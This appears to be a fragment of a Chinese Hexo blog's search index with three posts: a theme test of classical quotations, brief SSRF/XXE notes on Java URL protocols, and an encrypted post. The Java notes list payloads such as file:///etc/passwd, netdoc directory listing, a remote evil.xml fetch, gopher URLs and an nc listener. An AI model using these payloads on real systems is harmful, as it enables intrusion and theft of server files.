        <content type="html"><![CDATA[<h1 id="测试一下Butterfly主题美化"><a href="#测试一下Butterfly主题美化" class="headerlink" title="测试一下Butterfly主题美化"></a>测试一下Butterfly主题美化</h1><ul><li>君子和而不同，穷则独善其身，达则兼济天下</li><li>君不见黄河之水天上来，奔流到海不复回</li><li>有朋自远方来，不亦乐乎</li><li>敏而好学，不耻下问</li><li>路漫漫其修远兮，吾将上下而求索</li></ul><h2 id="引用结束："><a href="#引用结束：" class="headerlink" title="引用结束："></a>引用结束：</h2>]]></content>
      
      
      <categories>
          
          <category> Butterfly主题美化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Butterfly主题美化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java协议</title>
      <link href="/2019/11/10/java%E5%8D%8F%E8%AE%AE/"/>
      <url>/2019/11/10/java%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<h2 id="java协议"><a href="#java协议" class="headerlink" title="java协议"></a>java协议</h2><p>JAVA默认提供了对file,ftp,gopher,http,https,jar,mailto,netdoc协议的支持。</p><h3 id="file-ssrf、xxe-："><a href="#file-ssrf、xxe-：" class="headerlink" title="file(ssrf、xxe)："></a>file(ssrf、xxe)：</h3><p> file:///etc/passwd</p><h3 id="netdoc-ssrf、xxe-："><a href="#netdoc-ssrf、xxe-：" class="headerlink" title="netdoc(ssrf、xxe)："></a>netdoc(ssrf、xxe)：</h3><p>知道文件名和文件路径，很简单我们只要知道文件路径然后利用我们的 netdoc 去列目录就能知道文件名了<br>netdoc:///var/www/html/<br>不常见</p><blockquote><p>ps:过滤了file、gopher可使用netdoc代替</p></blockquote><h3 id="jar-ssrf、xxe"><a href="#jar-ssrf、xxe" class="headerlink" title="jar(ssrf、xxe):"></a>jar(ssrf、xxe):</h3><p>jar:<a href="http://localhost:9999/jar.zip!/1.php">http://localhost:9999/jar.zip!/1.php</a></p><h3 id="http-ssrf、xxe"><a href="#http-ssrf、xxe" class="headerlink" title="http(ssrf、xxe):"></a>http(ssrf、xxe):</h3><p><a href="http://url/file.ext">http://url/file.ext</a><br><a href="http://example.com/evil.xml">http://example.com/evil.xml</a></p><h3 id="gopher-ssrf、xxe"><a href="#gopher-ssrf、xxe" class="headerlink" title="gopher(ssrf、xxe):"></a>gopher(ssrf、xxe):</h3><p>gopher://ip:port/xxx</p><blockquote><p>监听：nc -vv -l -p port</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>博客搭建</title>
      <link href="/2019/09/10/Hexo+GitHub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%BD%91%E7%AB%99/"/>
      <url>/2019/09/10/Hexo+GitHub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%BD%91%E7%AB%99/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="8df105d85bff050e063b9b46f0df0ca84eec1d8a6ed7217438a8a9b11bef0ba4"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
